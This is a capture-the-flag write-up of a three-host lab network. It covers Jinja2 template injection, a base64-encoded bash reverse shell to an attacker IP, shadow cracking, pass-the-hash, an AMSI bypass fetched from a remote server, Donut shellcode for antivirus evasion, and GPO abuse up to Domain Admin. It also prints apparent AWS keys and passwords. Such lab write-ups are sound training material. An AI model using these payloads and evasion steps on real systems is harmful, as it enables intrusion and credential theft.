---
title: "Odyssey"
platform: "HackSmarter"
category: "Windows"
difficulty: "Hard"
date: 2025-12-04
os: "Windows Server 2025 / Ubuntu 24.04"
tags: ["windows", "linux", "ssti", "active-directory", "gpo-abuse", "backup-operators", "pass-the-hash", "credential-reuse"]
---

![Odyssey Banner](/assets/images/ctf/odyssey/banner.png)

---

## Overview

**Platform:** HackSmarter
**Difficulty:** Hard
**Domain:** hsm.local

This is a multi-machine engagement consisting of three hosts: one Linux web server and two Windows enterprise systems. The environment simulates a corporate network with Active Directory.

---

## Scope

```
Host              IP Address      Operating System        Role
─────────────────────────────────────────────────────────────────────
Linux Web Server  10.1.21.127     Ubuntu 24.04            Odyssey Portal
WKST-01           10.1.217.65     Windows Server 2025     Workstation
DC01              10.1.50.226     Windows Server 2025     Domain Controller
```

---

## Executive Summary

The engagement identified critical vulnerabilities across all three systems:

- **Critical SSTI vulnerability** on web application leading to RCE
- **Credential reuse** enabling lateral movement to Windows workstation
- **Backup Operators group membership** allowing SAM database extraction
- **GPO misconfiguration** (GenericWrite) enabling privilege escalation to Domain Admin

**Risk Rating:** Critical

---

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────┐
│  SSTI (Web App) → Shell as ghill_sa → SSH Key → Root on Linux  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│           Credential Reuse → RDP to WKST-01                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│         Backup Operators → SAM Dump → Admin Hash                │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│              PTH → SMBClient → Flag (user2.txt)                 │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│        Domain User (bbarkinson) → WinRM to DC01                 │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│       GPO Abuse (GenericWrite) → Local Admin (john)             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Domain Admin Access                          │
└─────────────────────────────────────────────────────────────────┘
```

---

# Phase 1: Linux Web Server (10.1.21.127)

## 1.1 Reconnaissance

Initial port scanning revealed two open services:

```bash
nmap -sCV 10.1.21.127 -Pn
```

```
Port    Service   Version
────────────────────────────────────
22      SSH       OpenSSH 9.6p1 Ubuntu
5000    HTTP      Werkzeug/3.1.3 Python/3.12.3
```

## 1.2 Web Application Analysis

The web application on port 5000 hosts the "Odyssey Portal" - an internal template preview service built with Python Flask/Werkzeug.

![Odyssey Portal](/assets/images/ctf/odyssey/odyssey-portal.png)

## 1.3 Server-Side Template Injection (SSTI)

The template input field was tested for SSTI vulnerabilities.

**Initial Test:**

```
{{ 7*7 }}
```

**Result:** `49` - Confirmed Jinja2 SSTI vulnerability

![SSTI Confirmed](/assets/images/ctf/odyssey/ssti-confirmed.png)

**Command Execution Test:**

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Result:** `uid=1000(ghill_sa) gid=1000(ghill_sa) groups=1000(ghill_sa)`

![SSTI RCE](/assets/images/ctf/odyssey/ssti-rce.png)

## 1.4 Initial Foothold

Reverse shell payload (Base64 encoded to bypass filters):

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMjAwLjIyLjEwOC80NDQ0IDA+JjEpICY=|base64 -d|bash').read() }}
```

The base64 decodes to:
```bash
(bash >& /dev/tcp/10.200.22.108/4444 0>&1) &
```

**Shell obtained as:** `ghill_sa`

## 1.5 Privilege Escalation to Root

During enumeration, SSH keys were discovered in the user's home directory:

```bash
cat ~/.ssh/id_ed25519
```

The private key allowed SSH authentication as root:

```bash
ssh -i id_ed25519 root@10.1.21.127
```

**Result:** Root shell obtained on Linux Web Server.

## 1.6 Additional Findings - AWS Metadata

LinPEAS revealed exposed EC2 security credentials:

```json
{
  "AccessKeyId": "ASIAZUVOFBPTLA5DGH2O",
  "SecretAccessKey": "899DO5CydZ7LE9FKhnksruVA6Hg61CzcTfJYPuUL",
  "Token": "[REDACTED]"
}
```

**Risk:** These credentials could be used for lateral movement within the AWS environment.

---

# Phase 2: Windows Workstation - WKST-01 (10.1.217.65)

## 2.1 Reconnaissance

```bash
nmap 10.1.217.65
```

```
Port    Service
────────────────
135     MSRPC
139     NetBIOS
445     SMB
3389    RDP
```

## 2.2 Credential Harvesting

Password hashes from the Linux server (`/etc/shadow`) were cracked:

```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

**Cracked Credentials:**

```
ghill_sa : P@ssw0rd!
```

## 2.3 RDP Access Validation

Testing credential reuse against the Windows workstation:

```bash
nxc rdp 10.1.217.65 -u ghill_sa -p 'P@ssw0rd!' --local-auth
```

```
RDP  10.1.217.65  3389  EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! (admin)
```

**Credential reuse confirmed!** The same password works on the Windows workstation.

## 2.4 Share Enumeration

Upon RDP access, a shared folder was discovered containing credentials:

```
Username        Password         Source File
───────────────────────────────────────────────────────
fin_user1       Spring2025!      Finance_Access.txt
hr_admin        Welcome123!      HR_Portal_Login.txt
intranet_admin  Intra#Access     Intranet_Admin.txt
ops_mgr         OpsSecure2025    Operations_Notes.txt
bbarkinson      [Domain User]    AD Configuration
```

## 2.5 Privilege Analysis

```powershell
whoami /all
```

**Key Finding:** User `ghill_sa` is a member of `BUILTIN\Backup Operators`

This group has special privileges to read any file on the system for backup purposes.

## 2.6 SAM Database Extraction

Using Backup Operators privileges to extract registry hives via Impacket's reg.py:

```bash
reg.py ghill_sa:'P@ssw0rd!'@10.1.217.65 backup -o 'C:/users/ghill_sa/desktop'
```

**Files Extracted:**
- SAM.save
- SYSTEM.save
- SECURITY.save

## 2.7 Hash Extraction

```bash
secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
```

**Critical Hashes Obtained:**

```
Account         NTLM Hash
───────────────────────────────────────
Administrator   d5cad8a<redacted>
bbarkinson      53c3709<redacted>
```

## 2.8 Pass-the-Hash Attack

Standard PTH methods (WMI, PSExec) were blocked by Windows Defender.

SMBClient was used successfully:

```bash
smbclient.py -hashes :<redacted> administrator@10.1.217.65
```

```
# use c$
# cd users/administrator/desktop
# ls
-rw-rw-rw-  118 Wed Nov 19 05:01:27 2025 user2.txt
# cat user2.txt
<redacted>
```

![User2 Flag](/assets/images/ctf/odyssey/user2-flag.png)

**Flag Retrieved!**

## 2.9 Alternative Access - Password Change

Used smbexec method to change administrator password for RDP access:

```bash
nxc smb 10.1.217.65 -u administrator -H '<redacted>' --local-auth --exec-method=smbexec -X 'net user administrator Password123!'
```

```
SMB  10.1.217.65  445  EC2AMAZ-NS87CNK  [+] Executed command via smbexec
SMB  10.1.217.65  445  EC2AMAZ-NS87CNK  The command completed successfully
```

---

# Phase 3: Domain Controller - DC01 (10.1.50.226)

## 3.1 Initial Domain Access

Using the domain user `bbarkinson` hash obtained from WKST-01's SAM dump:

```bash
evil-winrm -i 10.1.50.226 -u 'bbarkinson' -H '<redacted>'
```

## 3.2 User Privilege Analysis

```powershell
whoami /all
```

**Group Memberships:**
- BUILTIN\Remote Management Users
- BUILTIN\Users
- NT AUTHORITY\Authenticated Users

**Privileges:**
- SeMachineAccountPrivilege (Add workstations to domain)
- SeChangeNotifyPrivilege
- SeIncreaseWorkingSetPrivilege

Standard domain user with WinRM access.

## 3.3 BloodHound Enumeration

Due to AMSI, a bypass was required:

```powershell
IEX(IWR -UseBasicParsing http://10.200.22.108:8000/amsi_patch.ps1)
```

SharpHound was executed using Donut shellcode loader to bypass AV:

```bash
# Create shellcode from SharpHound
donut -i SharpHound.exe -a 2 -b 2 -p '-c All --zipfilename loot.zip --outputdirectory C:\Users\bbarkinson\Documents' -o ./sharphound.bin

# Base64 encode for transfer
base64 -w0 sharphound.bin > implant.enc
```

Execute via runner:

```powershell
.\runner.exe --remote http://10.200.22.108:8000/implant.enc
```

## 3.4 Attack Path Discovery

BloodHound analysis revealed a critical misconfiguration:

```
BBARKINSON@HSM.LOCAL --[GenericWrite]--> FINANCE POLICY (GPO)
```

![BloodHound GPO Abuse Path](/assets/images/ctf/odyssey/bloodhound-gpo.png)

**GPO Details:**

```
Property        Value
───────────────────────────────────────────────────
GPO Name        Finance Policy
GUID            526CDF3A-10B6-4B00-BCFA-36E59DCD71A2
Vulnerability   GenericWrite ACL
```

## 3.5 GPO Abuse - Privilege Escalation

Using pyGPOAbuse to add a scheduled task that creates a local admin:

```bash
pygpoabuse.py hsm.local/bbarkinson -hashes :<redacted> -gpo-id "526CDF3A-10B6-4B00-BCFA-36E59DCD71A2" -dc-ip 10.1.50.226 -f
```

**Default Credentials Created by pyGPOAbuse:**

```
john : H4x00r123..
```

## 3.6 Admin Access Verification

```bash
nxc smb 10.1.50.226 -u john -p 'H4x00r123..'
```

```
SMB  10.1.50.226  445  DC01  [+] hsm.local\john:H4x00r123.. (admin) - Pwn3d!
```

## 3.7 Domain Admin Shell

```bash
evil-winrm -i 10.1.50.226 -u john -p 'H4x00r123..'
```

**Domain Admin shell obtained!**

---

## Credentials Summary

```
Phase 1 - Linux Web Server (10.1.21.127)
────────────────────────────────────────────────────────────────
ghill_sa        : P@ssw0rd!           → User (SSTI RCE)
root            : [SSH Key Auth]      → Root (via id_ed25519)

Phase 2 - WKST-01 (10.1.217.65)
────────────────────────────────────────────────────────────────
ghill_sa        : P@ssw0rd!           → Backup Operators (RDP)
Administrator   : [NTLM Hash PTH]     → Local Admin (SMBClient)

Phase 3 - DC01 (10.1.50.226)
────────────────────────────────────────────────────────────────
bbarkinson      : [NTLM Hash PTH]     → Domain User (WinRM)
john            : H4x00r123..         → Domain Admin (GPO Abuse)
```

---

## Tools Used

- **Nmap** - Port scanning and service enumeration
- **NetExec (nxc)** - SMB/RDP validation, command execution
- **Hashcat** - Password cracking (SHA-512 Linux hashes)
- **Impacket** - reg.py, secretsdump.py, smbclient.py, evil-winrm
- **BloodHound/SharpHound** - Active Directory enumeration
- **Donut** - Shellcode generation for AV bypass
- **pyGPOAbuse** - GPO exploitation for privilege escalation
- **LinPEAS** - Linux privilege escalation enumeration

---

## References

- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [Backup Operators Abuse](https://www.hackingarticles.in/windows-privilege-escalation-backup-operators/)
- [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [Donut Shellcode Loader](https://github.com/TheWover/donut)
